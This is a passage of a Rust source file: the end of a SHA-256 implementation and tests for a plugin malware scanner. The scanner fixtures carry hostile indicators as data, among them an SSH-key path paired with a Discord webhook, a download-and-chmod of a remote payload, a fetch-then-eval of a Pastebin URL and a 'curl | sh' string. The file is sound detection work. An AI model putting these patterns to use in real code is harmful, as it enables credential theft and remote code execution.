            w[i] = w[i - 16].wrapping_add(s0).wrapping_add(w[i - 7]).wrapping_add(s1);
        }
        let [mut a, mut b2, mut c, mut d, mut e, mut f, mut g, mut h] = self.h;
        for i in 0..64 {
            let s1 = e.rotate_right(6) ^ e.rotate_right(11) ^ e.rotate_right(25);
            let ch = (e & f) ^ (!e & g);
            let t1 = h.wrapping_add(s1).wrapping_add(ch).wrapping_add(K[i]).wrapping_add(w[i]);
            let s0 = a.rotate_right(2) ^ a.rotate_right(13) ^ a.rotate_right(22);
            let maj = (a & b2) ^ (a & c) ^ (b2 & c);
            let t2 = s0.wrapping_add(maj);
            h = g;
            g = f;
            f = e;
            e = d.wrapping_add(t1);
            d = c;
            c = b2;
            b2 = a;
            a = t1.wrapping_add(t2);
        }
        for (s, v) in self.h.iter_mut().zip([a, b2, c, d, e, f, g, h]) {
            *s = s.wrapping_add(v);
        }
    }

    pub(crate) fn finish_hex(mut self) -> String {
        let bits = self.len.wrapping_mul(8);
        let mut tail = std::mem::take(&mut self.buf);
        tail.push(0x80);
        while tail.len() % 64 != 56 {
            tail.push(0);
        }
        tail.extend_from_slice(&bits.to_be_bytes());
        for c in tail.chunks_exact(64) {
            self.block(c.try_into().unwrap());
        }
        self.h.iter().map(|v| format!("{v:08x}")).collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sha(data: &[u8]) -> String {
        let mut h = Sha256::new();
        h.update(data);
        h.finish_hex()
    }

    #[test]
    fn sha256_known_values() {
        assert_eq!(sha(b""), "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
        assert_eq!(sha(b"abc"), "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
        let long = vec![b'a'; 1000];
        let mut h = Sha256::new();
        for c in long.chunks(7) {
            h.update(c);
        }
        assert_eq!(h.finish_hex(), sha(&long));
    }

    fn fake_macho(strings: &[&str]) -> Vec<u8> {
        let mut b = vec![0xcf, 0xfa, 0xed, 0xfe, 0, 0, 0, 0];
        for s in strings {
            b.extend_from_slice(s.as_bytes());
            b.push(0);
        }
        b
    }

    #[test]
    fn clean_effect_is_safe() {
        let bytes = fake_macho(&["_znd_plugin_describe", "_znd_plugin_render", "_powf", "_memcpy", "com.example.vignette", "Vignette"]);
        let fs = scan_bytes(Path::new("v.dylib"), &bytes, &Declared::default());
        assert!(fs.findings.is_empty(), "{:?}", fs.findings);
    }

    #[test]
    fn exfiltration_is_critical() {
        let dir = std::env::temp_dir().join(format!("znd-scan-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let file = dir.join("evil.dylib");
        std::fs::write(
            &file,
            fake_macho(&["_znd_plugin_render", "_socket", "_connect", "_getaddrinfo", "/.ssh/id_rsa", "https://discord.com/api/webhooks/1/abc"]),
        )
        .unwrap();
        let r = scan_path(&file, &Declared::default());
        assert_eq!(r.level, RiskLevel::Critical, "{:#?}", r.findings);
        assert!(r.has(Category::Network) && r.has(Category::Sensitive) && r.has(Category::Behavior));
        assert!(r.level.blocks());
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn downloader_is_flagged() {
        let bytes = fake_macho(&["_curl_easy_perform", "_system", "chmod +x /tmp/x", "http://45.13.22.9/payload"]);
        let fs = scan_bytes(Path::new("d.so"), &bytes, &Declared::default());
        assert!(fs.network && fs.exec);
        assert!(fs.findings.iter().any(|f| f.category == Category::Endpoint && f.evidence.iter().any(|e| e.contains("45.13.22.9"))));
    }

    #[test]
    fn version_numbers_and_docs_urls_are_ignored() {
        let mut out = BTreeSet::new();
        endpoints("version 1.2.3.4 see http://www.apple.com/DTDs/PropertyList-1.0.dtd", &mut out);
        out.retain(|u| !BENIGN_HOSTS.contains(&host_of(u).as_str()));
        assert!(out.is_empty(), "{out:?}");
    }

    #[test]
    fn script_network_intent() {
        let fs = scan_bytes(Path::new("a.js"), b"fetch('https://pastebin.com/raw/x').then(eval)", &Declared::default());
        assert!(fs.network);
        assert!(fs.findings.iter().any(|f| f.category == Category::Endpoint && f.score >= 35));
    }

    #[test]
    fn symbols_need_exact_match() {
        // "connection" や "systemFont" のような普通の語は通信・実行として数えない
        let bytes = fake_macho(&["_connection_count", "systemFont", "_reconnect_ui"]);
        let fs = scan_bytes(Path::new("x.dylib"), &bytes, &Declared::default());
        assert!(!fs.network && !fs.exec, "{:?}", fs.findings);
    }

    #[test]
    fn pipe_to_shell_needs_a_word_boundary() {
        assert!(contains_word_end("curl x | sh", "| sh"));
        assert!(contains_word_end("a|sh -c", "|sh"));
        assert!(!contains_word_end("and|or|xor|shift|", "|sh"));
        assert!(contains_word_end("/bin/sh", "/bin/sh"));
    }
}
